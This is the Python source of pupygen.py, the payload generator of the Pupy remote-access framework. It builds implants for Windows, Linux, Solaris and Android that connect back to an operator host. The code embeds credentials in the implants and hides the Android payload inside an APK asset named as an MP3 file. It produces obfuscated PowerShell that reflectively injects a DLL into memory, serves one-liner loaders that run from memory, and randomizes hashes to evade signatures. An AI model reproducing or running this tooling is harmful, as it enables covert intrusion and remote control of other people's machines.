#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import argparse
import sys
import os.path
import random
import string
import zipfile
import tarfile
import tempfile
import shutil
import subprocess
import pkgutil

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__)))

if __name__ == '__main__':
    sys.path.insert(0, os.path.join(ROOT, 'pupy', 'library_patches'))

import marshal
import scriptlets
import cPickle
import base64
import os
import pylzma
import struct

from pupylib.utils.network import get_listener_ip, get_listener_port
from pupylib.utils.term import colorize
from pupylib.payloads import dependencies
from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
from pupylib.payloads.rubber_ducky import rubber_ducky
from pupylib.utils.obfuscate import compress_encode_obfs
from pupylib.PupyConfig import PupyConfig
from pupylib.PupyCompile import pupycompile
from pupylib.PupyLogger import getLogger
from network.conf import transports, launchers
from network.lib.base_launcher import LauncherError
from scriptlets.scriptlets import ScriptletArgumentError
from modules.lib.windows.powershell import obfuscatePowershellScript
from pupylib.PupyCredentials import Credentials, EncryptionError

logger = getLogger('gen')

HARDCODED_CONF_SIZE=65536

def get_edit_binary(path, conf, compressed_config=True, debug=False):
    logger.debug("generating binary %s with conf: %s"%(path, conf))
    binary=b""
    with open(path, 'rb') as f:
        binary=f.read()
    i=0
    offsets=[]
    while True:
        i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n", i+1)
        if i==-1:
            break
        offsets.append(i)

    if not offsets:
        raise Exception("Error: the offset to edit the config have not been found")
    elif len(offsets) > 1:
        raise Exception("Error: multiple offsets to edit the config have been found")

    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<config>', 'exec'))
    uncompressed = len(new_conf)
    if compressed_config:
        new_conf = pylzma.compress(new_conf)
    compressed = len(new_conf)
    new_conf = struct.pack('>II', compressed, uncompressed) + new_conf
    new_conf_len = len(new_conf)

    if new_conf_len > HARDCODED_CONF_SIZE:
        raise Exception(
            'Error: config or offline script too long ({}/{} bytes)'
            'You need to recompile the dll with a bigger buffer'.format(new_conf_len, HARDCODED_CONF_SIZE)
        )

    new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)

    logger.debug('Free space: %d', HARDCODED_CONF_SIZE-new_conf_len)

    offset = offsets[0]
    binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
    return binary

def get_raw_conf(conf, obfuscate=False, verbose=False):

    credentials = Credentials(role='client')

    if "offline_script" not in conf:
        offline_script=""
    else:
        offline_script=conf["offline_script"]

    launcher = launchers[conf['launcher']]()
    launcher.parse_args(conf['launcher_args'])

    required_credentials = set(launcher.credentials) \
      if hasattr(launcher, 'credentials') else set([])

    transport = launcher.get_transport()
    transports_list = []

    if transport:
        transports_list = [transport]
        if transports[transport].credentials:
            for name in transports[transport].credentials:
                required_credentials.add(name)
    elif not transport:
        for n, t in transports.iteritems():
            transports_list.append(n)

            if t.credentials:
                for name in t.credentials:
                    required_credentials.add(name)

    available = []
    not_available = []

    for cred in required_credentials:
        if credentials[cred]:
            available.append(cred)
        else:
            not_available.append(cred)

    print colorize("[+] ", "green") + 'Required credentials (found):\n{}'.format(
        colorize("[+] ", "green") + ', '.join(available))

    if not_available:
        print colorize("[-] ", "red") + 'Required credentials (not found):\n{}'.format(
            colorize("[-] ", "red") + ', '.join(not_available))

    embedded_credentials = '\n'.join([
        '{}={}'.format(credential, repr(credentials[credential])) \
        for credential in required_credentials if credentials[credential] is not None
    ])+'\n'

    if verbose:
        for k, v in conf.iteritems():
            if k in ('offline_script'):
                continue

            print colorize("[C] {}: {}".format(k, v), "yellow")

    config = '\n'.join([
        'pupyimporter.pupy_add_package({})'.format(
            repr(cPickle.dumps({
                'pupy_credentials.pye':
                bytes(pupycompile(embedded_credentials, obfuscate=True))
            }))),
        dependencies.importer(set(
            'network.transports.{}'.format(transport) for transport in transports_list
        ), path=ROOT),
        'import sys',
        'sys.modules.pop("network.conf")',
        'import network.conf',
        'LAUNCHER={}'.format(repr(conf['launcher'])),
        'LAUNCHER_ARGS={}'.format(repr(conf['launcher_args'])),
        'CONFIGURATION_CID={}'.format(conf.get('cid', 0x31338)),
        'pupy.cid = CONFIGURATION_CID',
        'debug={}'.format(bool(conf.get('debug', False))),
        offline_script
    ])

    return compress_encode_obfs(config) if obfuscate else config

def updateZip(zipname, filename, data):
    # generate a temp file
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
    os.close(tmpfd)

    # create a temp copy of the archive without filename
    with zipfile.ZipFile(zipname, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
            zout.comment = zin.comment # preserve the comment
            for item in zin.infolist():
                if item.filename != filename:
                    zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    os.remove(zipname)
    os.rename(tmpname, zipname)

    # now add filename with its new data
    with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)

def updateTar(arcpath, arcname, file_path):
    tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
    try:
        with tarfile.open(arcpath, 'r') as tfr:
            names=tfr.getnames()
            tfr.extractall(tempdir)
            for root, dirs, files in os.walk(tempdir):
                for dir in dirs:
                    os.chmod(os.path.join(root, dir), 0700)
                for file in files:
                    os.chmod(os.path.join(root, file), 0600)

            with tarfile.open(arcpath+"2", 'w:gz') as tfw:
                for n in names:
                    #print "adding %s"%n
                    if n!=arcname:
                        tfw.add(os.path.join(tempdir, n), arcname=n, recursive=False)
                    else:
                        tfw.add(file_path, arcname=n, recursive=False)
        shutil.copy(arcpath+"2", arcpath)
    finally:
        shutil.rmtree(tempdir)

def get_edit_apk(path, conf, compressed_config=None, debug=False):
    tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
    fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
    try:
        packed_payload=pack_py_payload(get_raw_conf(conf), debug)
        shutil.copy(path, tempapk)

        #extracting the python-for-android install tar from the apk
        zf=zipfile.ZipFile(path,'r')
        zf.extract("assets/private.mp3", tempdir)
        zf.close()

        with open(os.path.join(tempdir,"pp.py"),'w') as w:
            w.write(packed_payload)
        import py_compile
        py_compile.compile(os.path.join(tempdir, "pp.py"), os.path.join(tempdir, "pp.pyo"))

        print "[+] packaging the apk ... (can take 10-20 seconds)"
        #updating the tar with the new config
        updateTar(os.path.join(tempdir,"assets/private.mp3"), "pp.pyo", os.path.join(tempdir,"pp.pyo"))
        #repacking the tar in the apk
        with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
            updateZip(tempapk, "assets/private.mp3", t.read())

        #signing the tar
        try:
            res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%tempapk, shell=True)
        except OSError as e:
            if e.errno ==os.errno.ENOENT:
                raise ValueError("Please install jarsigner first.")
            raise e
        # -tsa http://timestamp.digicert.com
        print(res)
        with open(tempapk) as apk:
            return apk.read()

    finally:
        #cleaning up
        shutil.rmtree(tempdir, ignore_errors=True)
        os.unlink(tempapk)

def generate_ps1(conf, outpath=False, output_dir=False, both=False, x64=False, x86=False):

    SPLIT_SIZE = 100000
    x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""

    if not outpath:
        outfile = tempfile.NamedTemporaryFile(
            dir=output_dir or '.',
            prefix='pupy_',
            suffix='.ps1',
            delete=False
        )
    else:
        try:
            os.unlink(outpath)
        except:
            pass

        outfile = open(outpath, 'w+b')

    outpath = outfile.name

    if both:
        code = """
        $PEBytes = ""
        if ([IntPtr]::size -eq 4){{
            {0}
            $PEBytesTotal = [System.Convert]::FromBase64String({1})
        }}
        else{{
            {2}
            $PEBytesTotal = [System.Convert]::FromBase64String({3})
        }}
        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
        """ # {1} = x86dll, {3} = x64dll
    else:
        code = """
        {0}
        $PEBytesTotal = [System.Convert]::FromBase64String({1})
        Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
        """

    if both or x64:
        # generate x64 ps1
        binaryX64 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x64', shared=True)[0])
        binaryX64parts = [binaryX64[i:i+SPLIT_SIZE] for i in range(0, len(binaryX64), SPLIT_SIZE)]
        for i, aPart in enumerate(binaryX64parts):
            x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
            x64ConcatCode += "$PEBytes{0}+".format(i)
        print(colorize("[+] ","green") + "X64 dll loaded and {0} variables used".format(i + 1))

    if both or x86:
        # generate x86 ps1
        binaryX86 = base64.b64encode(generate_binary_from_template(conf, 'windows', arch='x86', shared=True)[0])
        binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
        for i, aPart in enumerate(binaryX86parts):
            x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
            x86ConcatCode += "$PEBytes{0}+".format(i)
        print(colorize("[+] ","green") + "X86 dll loaded and {0} variables used".format(i + 1))

    script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())

    # adding some more obfuscation
    random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])
    script      = script.replace('Invoke-ReflectivePEInjection', random_name)
    code        = code.replace('Invoke-ReflectivePEInjection', random_name)

    if both:
        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1])))
    elif x64:
        outfile.write("{0}\n{1}".format(script, code.format(x64InitCode, x64ConcatCode[:-1])))
    elif x86:
        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1])))

    outfile.close()

    return outpath

def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None, compressed=True):
    TEMPLATE_FMT = fmt or 'pupy{arch}{debug}{unk}.{ext}'
    ARCH_CONVERT = {
        'amd64': 'x64', 'x86_64': 'x64',
        'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86',
    }

    TO_PLATFORM = {
        'x64': 'intel',
        'x86': 'intel'
    }

    TO_ARCH = {
        'intel': {
            '32bit': 'x86',
            '64bit': 'x64'
        }
    }

    arch = arch.lower()
    arch = ARCH_CONVERT.get(arch, arch)
    if bits:
        arch = TO_ARCH[TO_PLATFORM[arch]]

    CLIENTS = {
        'android': (get_edit_apk, 'pupy.apk', False),
        'linux': (get_edit_binary, TEMPLATE_FMT, True),
        'solaris': (get_edit_binary, TEMPLATE_FMT, True),
        'windows': (get_edit_binary, TEMPLATE_FMT, False),
    }

    SUFFIXES = {
        'windows': ('exe', 'dll'),
        'linux':   ('lin', 'lin.so'),
        'solaris': ('sun', 'sun.so'),
    }

    osname = osname.lower()

    if osname not in CLIENTS.keys():
        raise ValueError('Unknown OS ({}), known = '.format(
            osname, ', '.join(CLIENTS.keys())))

    generator, template, makex = CLIENTS[osname]

    if '{arch}' in template and not arch:
        raise ValueError('arch required for the target OS ({})'.format(osname))

    shared_ext = 'xxx'
    non_shared_ext = 'xxx'

    if osname in SUFFIXES:
        non_shared_ext, shared_ext = SUFFIXES[osname]

    debug_fmt = 'd' if debug else ''

    if shared:
        makex = False
        ext = shared_ext
    else:
        ext = non_shared_ext

    filename = template.format(arch=arch, debug=debug_fmt, ext=ext, unk='.unc' if not compressed else '')
    template = os.path.join(
        'payload_templates', filename
    )

    if not os.path.isfile(template):
        template = os.path.join(
            ROOT, 'payload_templates', filename
        )

    if not os.path.isfile(template):
        raise ValueError('Template not found ({})'.format(template))

    for k, v in config.iteritems():
        if k in ('offline_script'):
            continue

        print colorize("[C] {}: {}".format(k, v), "yellow")

    return generator(template, config, compressed, debug), filename, makex

def load_scriptlets():
    scl={}
    for loader, module_name, is_pkg in pkgutil.iter_modules(scriptlets.__path__):
        if is_pkg:
            module=loader.find_module(module_name).load_module(module_name)
            for loader2, module_name2, is_pkg2 in pkgutil.iter_modules(module.__path__):
                if module_name2=="generator":
                    module2=loader2.find_module(module_name2).load_module(module_name2)
                    if not hasattr(module2, 'ScriptletGenerator'):
                        logger.error("scriptlet %s has no class ScriptletGenerator"%module_name2)
                    else:
                        scl[module_name]=module2.ScriptletGenerator
    return scl

def parse_scriptlets(args_scriptlet, os=None, arch=None, debug=False):
    scriptlets_dic = load_scriptlets()
    sp = scriptlets.scriptlets.ScriptletsPacker(os, arch, debug=debug)
    for sc in args_scriptlet:
        tab=sc.split(",",1)
        sc_args={}
        name=tab[0]
        if len(tab)==2:
            try:
                for x,y in [x.strip().split("=") for x in tab[1].split(",")]:
                    sc_args[x.strip()]=y.strip()
            except:
                raise ValueError("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)

        if name not in scriptlets_dic:
            raise ValueError("unknown scriptlet %s, valid choices are : %s"%(
                repr(name), [
                    x for x in scriptlets_dic.iterkeys()
                ]))

        print colorize("[+] ","green")+"loading scriptlet %s with args %s"%(repr(name), sc_args)
        try:
            sp.add_scriptlet(scriptlets_dic[name](**sc_args))
        except ScriptletArgumentError as e:
            print(colorize("[-] ","red")+"Scriptlet %s argument error : %s"%(repr(name),str(e)))
            print("")
            print("usage: pupygen.py ... -s %s,arg1=value,arg2=value,... ..."%name)
            scriptlets_dic[name].print_help()
            raise ValueError('{}'.format(e))

    script_code=sp.pack()
    return script_code

class InvalidOptions(Exception):
    pass

class ListOptions(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        print colorize("## available formats :", "green")+" usage: -f <format>"
        print "\t- client           : generate client binary"
        print "\t- py               : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
        print "\t- pyinst           : generate a python file compatible with pyinstaller"
        print "\t- py_oneliner      : same as \"py\" format but served over http to load it from memory with a single command line."
        print "\t- ps1              : generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process."
        print "\t- ps1_oneliner     : load pupy remotely from memory with a single command line using powershell."
        print "\t- rubber_ducky     : generate a Rubber Ducky script and inject.bin file (Windows Only)."
        print ""
        print colorize("## available transports :","green")+" usage: -t <transport>"
        for name, tc in transports.iteritems():
            try:
                print "\t- {:<14} : {}".format(name, tc.info)
            except Exception as e:
                logger.error(e)

        print colorize("## available scriptlets :", "green")+" usage: -s <scriptlet>,<arg1>=<value>,<args2=value>..."
        scriptlets_dic=load_scriptlets()
        for name, sc in scriptlets_dic.iteritems():
            print "\t- {:<15} : ".format(name)
            print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])

        raise InvalidOptions

PAYLOAD_FORMATS = [
    'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky'
]

CLIENT_OS = ['android', 'windows', 'linux', 'solaris']
CLIENT_ARCH = ['x86', 'x64']

def get_parser(base_parser, config):
    parser = base_parser(description='Generate payloads for windows, linux, osx and android.')
    parser.add_argument('-f', '--format', default=config.get('gen', 'format'),
                            choices=PAYLOAD_FORMATS, help="(default: client)")
    parser.add_argument('-O', '--os', default=config.get('gen', 'os'),
                            choices=CLIENT_OS, help='Target OS (default: windows)')
    parser.add_argument('-A', '--arch', default=config.get('gen', 'arch'),
                            choices=CLIENT_ARCH, help='Target arch (default: x86)')
    parser.add_argument('-U', '--uncompressed', default=False, action='store_true',
                            help='Use uncompressed template')
    parser.add_argument('-P', '--packer', default=config.get('gen', 'packer'), help='Use packer when \'client\' output format (default: %(default)s)')
    parser.add_argument('-S', '--shared', default=False, action='store_true', help='Create shared object')
    parser.add_argument('-o', '--output', help="output filename")

    default_payload_output = '.'
    try:
        default_payload_output = config.get_path('payload_output', dir=True)
    except ValueError, e:
        logger.error('Invalid value for "payload_output" in config file: %s', e)

    parser.add_argument('-D', '--output-dir', default=default_payload_output, help="output folder (default: %(default)s)")
    parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
    parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
    parser.add_argument('-E', '--prefer-external', default=config.getboolean('gen', 'external'),
                            action='store_true', help="In case of autodetection prefer external IP")
    parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
    parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
    parser.add_argument('--oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner locally (default: %(default)s)")
    parser.add_argument('--oneliner-no-ssl', default=False, action='store_true', help="No ssl for ps1_oneliner stages (default: %(default)s)")
    parser.add_argument('--oneliner-nothidden', default=False, action='store_true', help="Powershell script not hidden target side (default: %(default)s)")
    parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
    parser.add_argument('--debug', action='store_true', help="build with the debug template (the payload open a console)")
    parser.add_argument('--workdir', help='Set Workdir (Default = current workdir)')
    parser.add_argument(
        'launcher', choices=[
            x for x in launchers.iterkeys()
        ], default=config.get('gen', 'launcher') or 'connect', nargs='?',
        help="Choose a launcher. Launchers make payloads behave differently at startup."
    )
    parser.add_argument(
        'launcher_args', default=config.get('gen', 'launcher_args'),
        nargs=argparse.REMAINDER, help="launcher options")
    return parser

def pupygen(args, config):
    ok = colorize("[+] ","green")

    if args.workdir:
        os.chdir(args.workdir)

    script_code=""
    if args.scriptlet:
        script_code=parse_scriptlets(
            args.scriptlet,
            os=args.os,
            arch=args.arch,
            debug=args.debug_scriptlets
        )


    launcher = launchers[args.launcher]()
    while True:
        try:
            launcher.parse_args(args.launcher_args)
        except LauncherError as e:
            if str(e).strip().endswith("--host is required") and "--host" not in args.launcher_args:
                myip = get_listener_ip(external=args.prefer_external, config=config)
                if not myip:
                    raise ValueError("--host parameter missing and couldn't find your local IP. "
                                         "You must precise an ip or a fqdn manually")
                myport = get_listener_port(config, external=args.prefer_external)

                print(colorize("[!] required argument missing, automatically adding parameter "
                                   "--host {}:{} from local or external ip address".format(myip, myport),"grey"))
                if "-t" in args.launcher_args or "--transport" in args.launcher_args:
                    args.launcher_args += ['--host', '{}:{}'.format(myip, myport)]
                else:
                    args.launcher_args += [
                        '--host', '{}:{}'.format(myip, myport), '-t', config.get('pupyd', 'transport')
                    ]
            elif str(e).strip().endswith('--domain is required') and '--domain' not in args.launcher_args:
                domain = config.get('pupyd', 'dnscnc').split(':')[0]
                if not domain or '.' not in domain:
                    print(colorize('[!] DNSCNC disabled!', 'red'))
                    return

                print(colorize("[!] required argument missing, automatically adding parameter "
                                   "--domain {} from configuration file".format(domain),"grey"))

                args.launcher_args = [
                    '--domain', domain
                ]

            else:
                launcher.arg_parser.print_usage()
                return
        else:
            break

    if args.randomize_hash:
        script_code+="\n#%s\n"%''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))

    conf = {
        'launcher': args.launcher,
        'launcher_args': args.launcher_args,
        'offline_script': script_code,
        'debug': args.debug,
        'cid': hex(random.SystemRandom().getrandbits(32))
    }

    outpath=args.output

    if not os.path.isdir(args.output_dir):
        print ok+"Creating the local folder '{0}' for generating payloads".format(args.output_dir)
        os.makedirs(args.output_dir)

    if args.format=="client":
        print ok+"Generate client: {}/{}".format(args.os, args.arch)

        data, filename, makex = generate_binary_from_template(
            conf, args.os,
            arch=args.arch, shared=args.shared, debug=args.debug,
            compressed=not (args.uncompressed or args.packer)
        )

        if not outpath:
            template, ext = filename.rsplit('.', 1)
            outfile = tempfile.NamedTemporaryFile(
                dir=args.output_dir or '.',
                prefix=template+'.',
                suffix='.'+ext,
                delete=False
            )
        else:
            try:
                os.unlink(outpath)
            except:
                pass

            outfile = open(outpath, 'w+b')

        outfile.write(data)
        outfile.close()

        if makex:
            os.chmod(outfile.name, 0711)

        if args.packer:
            packingFinalCmd = args.packer.replace('%s', outfile.name)
            print ok+"Packing payload with this command: {0}".format(packingFinalCmd)
            subprocess.check_call(
                packingFinalCmd,
                shell=True
            )

        outpath = outfile.name

    elif args.format=="py" or args.format=="pyinst":
        linux_modules = ''
        if not outpath:
            outfile = tempfile.NamedTemporaryFile(
                dir=args.output_dir or '.',
                prefix='pupy_',
                suffix='.py',
                delete=False
            )
        else:
            try:
                os.unlink(outpath)
            except:
                pass

            outfile = open(outpath, 'w+b')

        if args.format=="pyinst":
            linux_modules = getLinuxImportedModules()
        packed_payload = pack_py_payload(get_raw_conf(conf, verbose=True), args.debug)

        outfile.write('\n'.join([
            '#!/usr/bin/env python',
            '# -*- coding: utf-8 -*-',
            linux_modules,
            packed_payload
        ]))
        outfile.close()

        outpath = outfile.name

    elif args.format=="py_oneliner":
        packed_payload = pack_py_payload(get_raw_conf(conf, verbose=True), args.debug)
        i=conf["launcher_args"].index("--host")+1
        link_ip=conf["launcher_args"][i].split(":",1)[0]
        serve_payload(packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)

    elif args.format=="ps1":
        outpath = generate_ps1(conf, outpath=outpath, output_dir=args.output_dir, both=True)

    elif args.format=="ps1_oneliner":
        if conf['launcher'] in ["connect", "auto_proxy"]:
            from pupylib.payloads.ps1_oneliner import serve_ps1_payload
            link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
            if not args.oneliner_no_ssl:
                sslEnabled = True
            else:
                sslEnabled = False

            if not args.no_use_proxy:
                useTargetProxy = True
            else:
                useTargetProxy = False

            serve_ps1_payload(conf, link_ip=link_ip, port=args.oneliner_listen_port, useTargetProxy=useTargetProxy, sslEnabled=sslEnabled, nothidden=args.oneliner_nothidden)
        elif conf['launcher'] == "bind":
            from pupylib.payloads.ps1_oneliner import send_ps1_payload
            outpath, target_ip, bind_port = "", None, None
            bind_port=conf["launcher_args"][conf["launcher_args"].index("--port")+1]
            if "--oneliner-host" in conf["launcher_args"]:
                target_ip=conf["launcher_args"][conf["launcher_args"].index("--oneliner-host")+1]
                send_ps1_payload(conf, bind_port=bind_port, target_ip=target_ip, nothidden=args.oneliner_nothidden)
            else:
                raise ValueError("You have to give me the --oneliner-host argument")
        else:
            raise ValueError("ps1_oneliner with {0} mode is not implemented yet".format(conf['launcher']))

    elif args.format=="rubber_ducky":
        rubber_ducky(conf).generateAllForOStarget()

    else:
        raise ValueError("Type %s is invalid."%(args.format))

    print(ok+"OUTPUT_PATH = %s"%os.path.abspath(outpath))
    print(ok+"SCRIPTLETS = %s"%args.scriptlet)
    print(ok+"DEBUG = %s"%args.debug)
    return os.path.abspath(outpath)

if __name__ == '__main__':
    Credentials.DEFAULT_ROLE = 'CLIENT'
    config = PupyConfig()
    parser = get_parser(argparse.ArgumentParser, config)
    try:
        pupygen(parser.parse_args(), config)
    except InvalidOptions:
        sys.exit(0)
    except EncryptionError, e:
        logger.error(e)
    except Exception, e:
        logger.exception(e)
        sys.exit(str(e))
